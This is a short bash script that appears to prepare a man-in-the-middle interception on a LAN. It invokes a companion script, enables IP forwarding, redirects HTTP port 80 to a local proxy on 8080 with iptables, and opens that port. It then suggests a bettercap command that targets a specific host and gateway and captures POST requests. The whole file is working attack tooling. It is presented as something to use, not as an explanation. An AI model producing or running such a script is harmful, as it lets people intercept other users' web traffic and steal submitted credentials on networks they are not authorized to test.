#!/bin/bash

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

$DIR/manoutthemiddle.sh

echo "--- setting /proc/sys/net/ipv4/ip_forward to 1"
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward

echo "--- adding PREROUTING REDIRECT to iptables"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -L PREROUTING

echo "--- adding INPUT ACCEPT to iptables"
iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
iptables -L INPUT

echo "=== maybe these commands can help next ==="
echo "bettercap --proxy -I wlan0 -P POST -G 192.168.0.1 -T 192.168.0.4"
